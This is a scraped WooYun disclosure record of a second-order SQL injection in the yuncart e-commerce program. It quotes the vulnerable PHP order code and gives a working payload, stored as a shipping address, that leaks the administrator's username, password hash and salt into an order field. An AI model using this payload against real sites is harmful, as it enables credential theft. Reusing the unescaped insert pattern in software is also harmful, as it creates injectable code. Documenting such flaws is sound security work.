{"id": 50438, "wybug_id": "wooyun-2014-077812", "wybug_title": "yuncart SQL注入一枚（二次注入，附演示EXP）", "wybug_corp": "yuncart", "wybug_author": "xiaoL", "wybug_date": "2014-10-02 09:50", "wybug_open_date": "2014-12-31 09:52", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-02：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-12-31：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 看这个程序主要是因为一个朋友，他觉得这玩意一定没有问题了。虽然是小程序，不过感觉程序员已经相当注意安全了，差点就放弃了。最后发现这个洞真是开心。 详细说明：  程序员对所有带入sql语句都包裹到了单引号中，底层model没有发现问题，全局过滤类似gpc，未发现整型没有intval。但是最后发现了从数据库 -> 数据库的逻辑。发现了本次的问题。在文件www\\include\\front\\buy.class.php中\n/**\t *  \t * 提交订单\t *\t *\t **/\tpublic function ordercomp() {\t\t\t\t$time = time();\t\t//判断订单执行条件\t\t//购物车\t\t$carts = $_SESSION[\"cart\"][\"list\"];\t\tif(!$carts) {\t\t\tredirect(array(\"index\",\"cart\"));\t\t}\t\t//收货地址\t\t$addressid = intval($_POST[\"addressid\"]); //整型过滤了，但是这个位置根据地址的id去取了用户的地址信息。\t\t$address = DB::getDB()->selectrow(\"user_address\",\"*\",\"uid=\".$this->uid.\" AND addressid='$addressid'\"); //获取地址信息\t\tif(!$address) cerror(__(\"error_address\"));\n继续看变量$address，还是在这个文件中\n$_SESSION['cart']['in'] = true;//正在执行订单\t\t$tradeid = $time . mt_rand(100,999);\t\t$data = array(\t\t\t\"tradeid\"\t\t\t=> $tradeid,\t\t\t\"uid\"\t\t\t\t=> $this->uid,\t\t\t\"uname\"\t\t\t\t=> $_SESSION['uname'],\t\t\t\"addtime\"\t\t\t=> $time,\t\t\t\"status\"\t\t\t=> \"WAIT_PAY\",//未支付\t\t\t\"totalfee\"\t\t\t=> getPrice($totalfee,2,'int'),\t\t\t\"itemfee\"\t\t\t=> getPrice($itemfee,2,'int'),\t\t\t\"postfee\"\t\t\t=> getPrice($postfee,2,'int'),\t\t\t\"man\"\t\t\t\t=> $man ? $man['str'] : '',\t\t\t\"coupon\"\t\t\t=> $coupon ? $coupon['deno'] : 0,\t\t\t\"expresswayid\"\t\t=> $wayid,\t\t\t\"posttype\"\t\t\t=> $posttype,\t\t\t\"receiver_name\"\t\t=> $address['receiver'],   //使用了取出的$address变量插入了语句 ，下面几个点都是一样\t\t\t\"receiver_province\" => $address['province'],\t\t\t\"receiver_city\"\t\t=> $address['city'],\t\t\t\"receiver_district\" => $address['district'],\t\t\t\"receiver_address\"  => $address['address'],\t\t\t\"receiver_zip\"\t    => $address['zipcode'],\t\t\t\"receiver_link\"     => $address['link'],\t\t\t\"memo\"\t\t\t\t=> $memo,\t\t\t\"payment\"\t\t\t=> $paymentcode,\t\t\t\"istax\"\t\t\t\t=> $istax,\t\t\t\"tax_company\"\t\t=> $tax_company\t\t);\t\tDB::getDB()->insert(\"trade\",$data);  //插入了sql语句中，导致了问题的发生。\t\t$adddata\t= $promodata\t= array();\n添加地址的代码本身没有问题，直接添加最终的exp即可。   漏洞证明：  通过分析了几张相关的表的字符长度与回显是否，选择了cart_trade表中tax_company字段作为回显cart_user_address表中address字段作为输入最终获取管理员密码的exp为：y','','','','cod',1,(select concat_ws('|',uname,pass,salt) from cart_admin limit 1))-- 11、\n\n2、随便选个一个商品，下订单，最后提交订单，在addressid字段选择我们提交exp的地址。\n\n3、查看我们的订单，账号信息就躺在里面了。\n\n   修复方案：  过滤   版权声明：转载请注明来源 xiaoL@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-11-16 03:53 |    \t\tzcy \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:15        )\t\t \n  目测xff？    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}